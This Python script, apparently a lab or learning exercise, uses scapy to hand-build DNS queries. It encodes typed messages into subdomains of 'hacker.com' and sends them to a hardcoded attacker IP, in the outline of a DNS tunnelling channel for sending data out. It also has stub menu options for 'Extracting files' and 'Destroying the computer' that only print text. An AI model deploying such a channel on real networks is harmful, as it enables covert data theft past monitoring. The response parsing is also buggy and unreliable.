import base64
import struct
import socket
from scapy.all import *

SRC_PORT = 40000
DST_PORT = 12345
IP_ATTACKER = "192.168.1.101"
DOMAIN_NAME = "hacker.com"

def run_client():
    """
    Runs the DNS client that builds a DNS query,
    sends a UDP packet to the specified attacker IP,
    and waits for a response.
    """
    message = input("Enter message: ")
    dns_query = build_dns_query(f"{message}.{DOMAIN_NAME}")
    udp_header = create_udp_header(SRC_PORT, DST_PORT, len(dns_query))
    payload = udp_header + dns_query

    # Construct the packet with an IP layer (UDP protocol is 17) and a Raw payload
    packet = IP(dst=IP_ATTACKER, proto=17) / Raw(load=payload)

    print("Sending packet ...")
    response = sr1(packet, timeout=10, filter=f"udp and dst port {DST_PORT}")

    if response:
        print("Received response:")
        response.show()
        ip = parse_dns_response(response)
        print("Extracted IP:", ip)
    else:
        print("No response received.")

def switch_case(choice2):
    """
    Executes an action based on the user's choice.
    """
    match choice2:
        case "1":
            print("Extracting files...")
        case "2":
            print("Destroying the computer...")
        case "3":
            print("Self destructing...")
        case "4":
            # Do nothing
            pass
        case _:
            print("Invalid choice. Please enter a number between 1 and 4.")

def create_udp_header(src_port, dest_port, data_length):
    """
    Creates a UDP header given the source port, destination port, and data length.
    """
    length = 8 + data_length  # UDP header is 8 bytes plus the data length
    checksum = 0
    return struct.pack("!HHHH", src_port, dest_port, length, checksum)

def build_dns_query(domain):
    """
    Constructs a DNS query for an A record for the given domain.
    """
    transaction_id = 12345  # A random transaction ID (ensure uniqueness in a real application)
    flags = 0x0100  # Standard query with recursion desired
    questions = 1
    answer_rrs = 0
    authority_rrs = 0
    additional_rrs = 0

    qname = encode_domain_name(domain)
    qtype = 1   # Type A (IPv4 address)
    qclass = 1  # Class IN (Internet)

    # Pack the DNS query header and question section
    query = struct.pack("!HHHHHH", transaction_id, flags, questions,
                        answer_rrs, authority_rrs, additional_rrs)
    query += qname
    query += struct.pack("!HH", qtype, qclass)

    return query

def encode_domain_name(domain):
    """
    Encodes a domain name into DNS query format.
    """
    labels = domain.split('.')
    encoded_name = b""
    for label in labels:
        encoded_name += struct.pack("B", len(label)) + label.encode()
    encoded_name += b"\x00"  # End of domain name
    return encoded_name

def parse_dns_response(response):
    """
    Extracts an IP address from the DNS response answer section.
    This simplistic approach assumes the IPv4 address is contained in the last 4 bytes.
    """
    ip_address = socket.inet_ntoa(response[-4:])
    return ip_address

if __name__ == "__main__":
    run_client()
